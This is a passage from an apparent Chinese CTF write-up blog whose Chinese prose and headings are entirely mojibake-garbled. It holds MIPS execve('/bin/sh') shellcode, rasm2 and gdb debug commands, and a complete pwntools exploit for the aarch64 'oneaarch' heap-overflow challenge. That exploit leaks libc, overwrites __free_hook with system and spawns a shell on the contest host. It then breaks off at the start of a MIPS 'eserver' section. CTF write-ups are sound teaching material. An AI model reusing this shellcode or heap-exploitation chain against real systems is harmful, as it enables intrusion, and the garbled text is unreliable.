0x6873         hs</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x6e\x2f\xce\x35&quot;</span>  <span class="comment"># ori $t6, $t6, 0x2f6e    hs/n</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xf8\xff\xae\xaf&quot;</span>  <span class="comment"># sw $t6, -8($sp)</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xfc\xff\xa0\xaf&quot;</span>  <span class="comment"># sw $zero, -4($sp)</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xf4\xff\xa4\x27&quot;</span>  <span class="comment"># addiu $a0, $sp, -0xc   //bin/sh</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xff\xff\x05\x28&quot;</span>  <span class="comment"># slti $a1, $zero, -1</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xab\x0f\x02\x24&quot;</span>  <span class="comment"># addiu $v0, $zero, 0xfab</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x0c\x01\x01\x01&quot;</span>  <span class="comment"># syscall 0x40404</span></span><br></pre></td></tr></table></div></figure>




        <h3 id="2-ä»æ ˆä¸Šå–æ•°æ®çš„ï¼š"   >
          <a href="#2-ä»æ ˆä¸Šå–æ•°æ®çš„ï¼š" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-ä»æ ˆä¸Šå–æ•°æ®çš„ï¼š" class="headerlink" title="(2)ä»æ ˆä¸Šå–æ•°æ®çš„ï¼š"></a>(2)ä»æ ˆä¸Šå–æ•°æ®çš„ï¼š</h3>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">shellcode1 = <span class="string">&quot;\x1c\xfe\xa4\x8f&quot;</span> + \</span><br><span class="line">    <span class="string">&quot;\x20\x28\x40\x02&quot;</span> + \</span><br><span class="line">    <span class="string">&quot;\x20\x30\x40\x02&quot;</span> + \</span><br><span class="line">    <span class="string">&quot;\x28\xfe\xa2\x8f&quot;</span> + \</span><br><span class="line">    <span class="string">&quot;\x0c\x01\x01\x01&quot;</span></span><br></pre></td></tr></table></div></figure>

<p>å¯¹åº”çš„å¦‚ä¸‹æ±‡ç¼–ä»£ç ï¼š</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rasm2 -a mips -b 32 -C <span class="string">&quot;lw a0,-0x1e4(sp)&quot;</span> 	<span class="comment">#a</span></span><br><span class="line">rasm2 -a mips -b 32 -C <span class="string">&quot;move a1,s2&quot;</span>			<span class="comment">#a1</span></span><br><span class="line">rasm2 -a mips -b 32 -C <span class="string">&quot;move a2,s2&quot;</span>			<span class="comment">#a2</span></span><br><span class="line">rasm2 -a mips -b 32 -C <span class="string">&quot;lw v0,-0x1d8(sp)&quot;</span>	<span class="comment">#v0</span></span><br><span class="line">rasm2 -a mips -b 32 -C <span class="string">&quot;syscall&quot;</span>			<span class="comment">#syscall</span></span><br></pre></td></tr></table></div></figure>




        <h2 id="6-è°ƒè¯•"   >
          <a href="#6-è°ƒè¯•" class="heading-link"><i class="fas fa-link"></i></a><a href="#6-è°ƒè¯•" class="headerlink" title="6.è°ƒè¯•"></a>6.è°ƒè¯•</h2>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set architecture mips</span><br><span class="line">set endian little</span><br><span class="line">symbol-file ./Mplogin</span><br><span class="line">target remote 127.0.0.1:12345</span><br></pre></td></tr></table></div></figure>








        <h1 id="ä¸‹è½½åº“"   >
          <a href="#ä¸‹è½½åº“" class="heading-link"><i class="fas fa-link"></i></a><a href="#ä¸‹è½½åº“" class="headerlink" title="ä¸‹è½½åº“"></a>ä¸‹è½½åº“</h1>
      <p>å¼‚æ„ä¸‹è½½åº“</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt install crossbuild-essential-*</span><br><span class="line">apt install qemu-user</span><br></pre></td></tr></table></div></figure>

</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/10/26/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%86%B3%E8%B5%9BWP/">å¼ºç½‘å†³èµ›æ‹Ÿæ€WP</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-10-26</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2023-09-11</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>ç™½ç›’é»‘ç›’å•¥çš„æˆ‘ä¸€ç‚¹éƒ½ä¸ä¼šï¼Œåªä¼šåšç‚¹CTFç„¶åç»™å¤§ä½¬ä»¬åŠ æ²¹ï¼é‚£äº›ä»€ä¹ˆç®€å•é¢˜å°±ä¸è¯´äº†ï¼Œæ€»ç»“ä¸€ä¸‹æ¯”è¾ƒæœ‰æ„æ€çš„ã€‚</p>

        <h1 id="ä¸€ã€oneaarch"   >
          <a href="#ä¸€ã€oneaarch" class="heading-link"><i class="fas fa-link"></i></a><a href="#ä¸€ã€oneaarch" class="headerlink" title="ä¸€ã€oneaarch"></a>ä¸€ã€oneaarch</h1>
      <p>è¿™æ˜¯ä¸ªaarchæ¶æ„çš„ç®€å•å †æº¢å‡ºçš„é¢˜ï¼Œç”±äºåšçš„æ—¶å€™ï¼Œæœ¬åœ°ç¯å¢ƒæ²¡æœ‰æ­çš„å¤ªå¥½ï¼Œä¹Ÿä¸å¤ªä¼šåœ¨PIEçš„æ—¶å€™æ–­ç‚¹è°ƒè¯•ï¼Œç›´æ¥å°±æ˜¯ç›²å †ï¼Œæ‰€ä»¥èŠ±äº†æŒºé•¿æ—¶é—´ã€‚</p>
<p>å¦å¤–è¿˜è¯´ä¸€ç‚¹çš„å°±æ˜¯æœ¬é¢˜çš„è®¾è®¡è¿˜ä¸é”™ï¼Œæ˜¯é€šè¿‡å­—èŠ‚æ¥è¿›è¡Œå †çš„å¸ƒç½®çš„ï¼Œä¹Ÿå°±æ˜¯åªèƒ½å‘é€ä¸€æ¬¡æ•°æ®ï¼Œç„¶åä¾æ®è¿™é‡Œé¢çš„æ•°æ®æ¥è¿›è¡Œå †çš„ç”³è¯·ä¸é‡Šæ”¾ï¼Œä¸ç¬¦åˆè§„åˆ™çš„å°±æ— æ³•æ­£ç¡®æ“ä½œã€‚å¦‚æœæŠŠè¿™ä¸ªæ€è·¯ç”¨åœ¨x86_64çš„æ¶æ„ä¸‹ï¼Œé‚£ä¹ˆå¾ˆå¤šéœ€è¦æ³„éœ²åœ°å€çš„å †é¢˜ç›´æ¥å°±æ²¡åŠæ³•åšäº†ï¼Œè¿˜æ˜¯å¾ˆæœ‰æ„æ€çš„ã€‚</p>
<p>ä½†æ˜¯è¿™é‡Œç”±äºqemuæ¨¡æ‹Ÿçš„å…³ç³»ï¼Œåœ¨PIEçš„æ¡ä»¶ä¸‹ï¼Œæ— è®ºå¯åŠ¨å¤šå°‘æ¬¡ï¼Œç¨‹åºçš„åŸºåœ°å€è¿˜æ˜¯ä¸å˜çš„ï¼Œç›¸å½“äºæ˜¯ä¸ªç®€å•ç‰ˆçš„PIE+ASLRã€‚è€Œåœ¨è¿™é¢˜é‡Œï¼Œç”±äºåªèƒ½å‘é€ä¸€æ¬¡payloadï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬å¯ä»¥å…ˆæ³„éœ²åœ°å€ï¼Œç„¶åå†è¿›è¡Œgetshellã€‚</p>

        <h2 id="1-æ³„éœ²åœ°å€"   >
          <a href="#1-æ³„éœ²åœ°å€" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-æ³„éœ²åœ°å€" class="headerlink" title="1.æ³„éœ²åœ°å€"></a>1.æ³„éœ²åœ°å€</h2>
      <p>åˆ©ç”¨å †æº¢å‡ºä¿®æ”¹sizeè¿›å…¥Unsortedbinæ³„éœ²åœ°å€å³å¯</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0xf8</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0xf8</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0xf8</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0xf8</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0xf8</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0xf8</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0xf8</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0xf8</span>+<span class="number">2</span>,<span class="string">&#x27;PIG007NB&#x27;</span>*(<span class="number">0xf8</span>/<span class="number">8</span>)+p16(<span class="number">0x501</span>))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x78</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x78</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x78</span>)</span><br><span class="line">p.recv()</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x8</span>,<span class="string">&quot;B&quot;</span>*<span class="number">8</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;B&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">leak = uu32(rc(<span class="number">3</span>))</span><br><span class="line">libc_base = leak- <span class="number">0x000658</span> - libc.sym[<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>]</span><br><span class="line">lg(<span class="string">&quot;libc_base&quot;</span>,libc_base)</span><br></pre></td></tr></table></div></figure>

<p>è¿™é‡Œæ³„éœ²åœ°å€çš„æ—¶å€™éœ€è¦æ³¨æ„ä¸€ä¸‹aarchæ¶æ„çš„libcåŠ è½½çš„åŒºåˆ«ï¼Œä¸€å®šæ˜¯0x4000000000æ‰“å¤´çš„ã€‚åŒæ—¶ç”±\x00çš„æˆªæ–­æˆ‘ä»¬åªèƒ½è·å–åˆ°åé¢çš„å‡ ä¸ªä¸æ˜¯\x00çš„æ•°æ®ï¼Œé‚£ä¹ˆå¾—åˆ°æ•°æ®ä¹‹åå‡å»åç§»å†åŠ ä¸Š0x4000000000å³å¯ã€‚</p>

        <h2 id="2-getshell"   >
          <a href="#2-getshell" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-getshell" class="headerlink" title="2.getshell"></a>2.getshell</h2>
      <p>è¿™é‡Œå°±ç›´æ¥è´´æ€»çš„wpäº†ï¼Œä¹Ÿå°±æ˜¯æ­£å¸¸çš„æº¢å‡ºåŠ åŠ«æŒfdä¸ºfree_hookï¼Œæ‰“free_hookå³å¯ã€‚</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment">#context</span></span><br><span class="line"><span class="comment">#context.arch = &#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#SigreturnFrame(kernel = &#x27;amd64&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context(arch=<span class="string">&#x27;aarch64&#x27;</span>)</span><br><span class="line"><span class="comment">#context(arch=&#x27;arm&#x27;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">localPort = <span class="string">&quot;12345&quot;</span></span><br><span class="line">arch = <span class="string">&quot;qemu-aarch64&quot;</span></span><br><span class="line"><span class="comment">#arch = &quot;qemu-arm&quot;</span></span><br><span class="line">linkLibrary = <span class="string">&quot;/home/hacker/glibc/2.31/aarch&quot;</span></span><br><span class="line"><span class="comment">#linkLibrary = &quot;/home/hacker/glibc/2.27/arm&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#libc = ELF(&quot;/home/hacker/glibc/2.31/arm/lib/libc.so.6&quot;)</span></span><br><span class="line"><span class="comment">#libc = ELF(&quot;/home/hacker/glibc/2.31/aarch/lib/libc.so.6&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.31.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">sd = <span class="keyword">lambda</span> s:p.send(s)</span><br><span class="line">sl = <span class="keyword">lambda</span> s:p.sendline(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> s:p.recv(s)</span><br><span class="line">ru = <span class="keyword">lambda</span> s:p.recvuntil(s)</span><br><span class="line">rl = <span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">sa = <span class="keyword">lambda</span> a,s:p.sendafter(a,s)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,s:p.sendlineafter(a,s)</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data   :u32(data.ljust(<span class="number">4</span>, <span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data   :u64(data.ljust(<span class="number">8</span>, <span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">u64Leakbase = <span class="keyword">lambda</span> offset :u64(ru(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>: ] + <span class="string">&#x27;\0\0&#x27;</span>) - offset</span><br><span class="line">u32Leakbase = <span class="keyword">lambda</span> offset :u32(ru(<span class="string">&quot;\xff&quot;</span>)[-<span class="number">4</span>: ]) - offset</span><br><span class="line">it      = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">global</span> chunkPayload</span><br><span class="line"></span><br><span class="line">remote_debug=<span class="number">0</span></span><br><span class="line">remoteFlag=<span class="number">1</span></span><br><span class="line">local=<span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> remote_debug==<span class="number">1</span>:</span><br><span class="line">    p = process([arch, <span class="string">&#x27;-L&#x27;</span>, linkLibrary, <span class="string">&#x27;-g&#x27;</span>, localPort, binary])</span><br><span class="line">    <span class="comment">#p = process([&#x27;qemu-arm&#x27;, &#x27;-L&#x27;, &#x27;/usr/arm-linux-gnueabi&#x27;, &#x27;-g&#x27;, &#x27;1234&#x27;, binary],env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc.so.6&quot;&#125;)</span></span><br><span class="line">    elf = ELF(binary)</span><br><span class="line"><span class="keyword">elif</span> local==<span class="number">1</span>:</span><br><span class="line">    p = process([arch, <span class="string">&#x27;-L&#x27;</span>, linkLibrary, binary])</span><br><span class="line">    elf = ELF(binary)</span><br><span class="line"><span class="keyword">elif</span> remoteFlag==<span class="number">1</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;172.35.30.11&quot;</span>,<span class="string">&quot;9999&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx,size</span>):</span></span><br><span class="line">    <span class="keyword">global</span> chunkPayload</span><br><span class="line">    chunkPayload += <span class="string">&#x27;\x01&#x27;</span></span><br><span class="line">    chunkPayload += p8(idx)</span><br><span class="line">    chunkPayload += p16(size)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    <span class="keyword">global</span> chunkPayload</span><br><span class="line">    chunkPayload += <span class="string">&#x27;\x02&#x27;</span></span><br><span class="line">    chunkPayload += p8(idx)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    <span class="keyword">global</span> chunkPayload</span><br><span class="line">    chunkPayload += <span class="string">&#x27;\x03&#x27;</span></span><br><span class="line">    chunkPayload += p8(idx)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,size,con</span>):</span></span><br><span class="line">    <span class="keyword">global</span> chunkPayload</span><br><span class="line">    chunkPayload += <span class="string">&#x27;\x04&#x27;</span></span><br><span class="line">    chunkPayload += p8(idx)</span><br><span class="line">    chunkPayload += p16(size)</span><br><span class="line">    chunkPayload += con</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mulArchDbg</span>():</span></span><br><span class="line">    os.system(<span class="string">&quot;gnome-terminal -- bash -c \&quot;gdb-multiarch -q &#123;0&#125; \</span></span><br><span class="line"><span class="string">        --eval-command=&#x27;target remote localhost:&#123;1&#125;&#x27;\&quot;&quot;</span>.<span class="built_in">format</span>(binary,localPort))</span><br><span class="line">    pause()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lg</span>(<span class="params">string,addr</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\033[1;31;40m%20s--&gt;0x%x\033[0m&#x27;</span>%(string,addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">chunkPayload = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"><span class="comment">#mulArchDbg()</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">remote_libc_base = <span class="number">0x848000</span></span><br><span class="line">local_libc_base = <span class="number">0x845000</span></span><br><span class="line">free_hook = remote_libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">_IO_2_1_stdout = remote_libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line">system = remote_libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">lg(<span class="string">&quot;remote_libc_base&quot;</span>,remote_libc_base)</span><br><span class="line">lg(<span class="string">&quot;free_hook&quot;</span>,free_hook)</span><br><span class="line">lg(<span class="string">&quot;system&quot;</span>,system)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0xf8</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0xf8</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0xf8</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0xf8</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0xf8</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0xf8</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0xf8</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0xf8</span>+<span class="number">2</span>,<span class="string">&#x27;PIG007NB&#x27;</span>*(<span class="number">0xf8</span>/<span class="number">8</span>)+p16(<span class="number">0x501</span>))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x78</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x78</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x78</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p.recv()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># sleep(1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># edit(1,0x8,&quot;B&quot;*8)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># show(1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#edit(3,0x3,p16(free_hook&amp;0xffff)+p8(free_hook&gt;&gt;16))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># show(1)</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>,<span class="number">0x8</span>,p64(<span class="number">0x4000000000</span>+free_hook))</span><br><span class="line"></span><br><span class="line"><span class="comment"># show(1)</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">7</span>,<span class="number">0xf8</span>)</span><br><span class="line"><span class="comment">#show(7)</span></span><br><span class="line">add(<span class="number">8</span>,<span class="number">0xf8</span>)</span><br><span class="line"><span class="comment">#show(8)</span></span><br><span class="line"><span class="comment">#edit(8,0x3,p16(system&amp;0xffff)+p8(system&gt;&gt;16))</span></span><br><span class="line">edit(<span class="number">8</span>,<span class="number">0x8</span>,p64(<span class="number">0x4000000000</span>+system))</span><br><span class="line"></span><br><span class="line"><span class="comment"># show(8)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#edit(8,0x3,p16(system&amp;0xffff)+p8(system&gt;&gt;16))</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">8</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.send(chunkPayload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ru(&#x27;B&#x27;*8)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak = uu32(rc(3))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># libc_base = leak- 0x000658 - libc.sym[&#x27;_IO_2_1_stdin_&#x27;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># lg(&quot;libc_base&quot;,libc_base)</span></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.recv()</span><br><span class="line">pause()</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment">#flag&#123;030fa6cc-ba7d-4b35-a847-a690953e2270&#125;</span></span><br></pre></td></tr></table></div></figure>


        <h1 id="äºŒã€eserver"   >
          <a href="#äºŒã€eserver" class="heading-link"><i class="fas fa-link"></i></a><a href="#äºŒã€eserver" class="headerlink" title="äºŒã€eserver"></a>äºŒã€eserver</h1>
      <p>è¿™é¢˜æ˜¯mipsæ¶æ„çš„pwné¢˜ï¼Œç”±äºæ²¡æœ‰æ¥è§¦è¿‡ï¼Œå½“æ—¶ç›´æ¥ç°å­¦äº†ä¸€æ³¢ï¼Œåé¢å†æŠŠæ‰€æœ‰æ¶æ„çš„pwné¢˜æ•´ä¸ªæ±‡æ€»æŠŠã€‚</p>
<p>æ ˆæº¢å‡ºé¢˜ï¼Œæ²¡å¼€canaryå’ŒNXï¼ŒæŒ‰ç†è¯´åº”è¯¥å¯ä»¥è¿”å›åˆ°æ ˆä¸Šç›´æ¥æ‰§è¡Œshellcodeã€‚é‚£ä¹ˆæœ¬åœ°ç›´æ¥ä¾ç…§è°ƒè¯•è·å–æ ˆåœ°å€è¿”å›æ ˆä¸Šè¿›è¡Œshellcodeï¼Œä½†æ˜¯è¿œç¨‹çš„æ—¶å€™éœ€è¦çˆ†ç ´ä¸€ä¸‹æ ˆåœ°å€ï¼Œä¹Ÿä¸ä¼šå¤ªå¤šï¼Œå› ä¸ºPIEåŸºæœ¬ç­‰äºä¸å­˜åœ¨ï¼Œæ ˆåœ°å€çš„èµ·å§‹ä½ç½®å¤§æ¦‚ç‡å°±æ˜¯0x7ffxx000ï¼Œåº”è¯¥åªéœ€è¦çˆ†ç ´xxè¿™ä¸€ä¸ªå­—èŠ‚ï¼Œæœ‰æ—¶å€™é€šå¸¸ä¹Ÿæ˜¯0x7ffex000ï¼Œä¹Ÿå°±æ˜¯åŠä¸ªå­—èŠ‚å³å¯ã€‚</p>
<p>æ­¤å¤–è¯´ä¸€ä¸‹è°ƒè¯•ï¼Œæ€•ä»¥åå¿˜äº†ã€‚ç”±äºå¼€å¯äº†PIEï¼Œå¦‚æœç›´æ¥qemuæ¨¡æ‹Ÿçš„è¯ï¼Œå¾ˆéš¾ç¡®å®šå‡½æ•°çš„ä½ç½®ï¼Œä¸å¥½ä¸‹æ–­ç‚¹ï¼Œæ‰€ä»¥è¿™é‡Œè®²ä¸€ä¸ªæ¯”è¾ƒå¸¸ç”¨åˆ°çš„æ–¹æ³•ã€‚</p>

        <h2 id="è°ƒè¯•"   >
          <a href="#è°ƒè¯•" class="heading-link"><i class="fas fa-link"></i></a><a href="#è°ƒè¯•" class="headerlink" title="è°ƒè¯•"></a>è°ƒè¯•</h2>
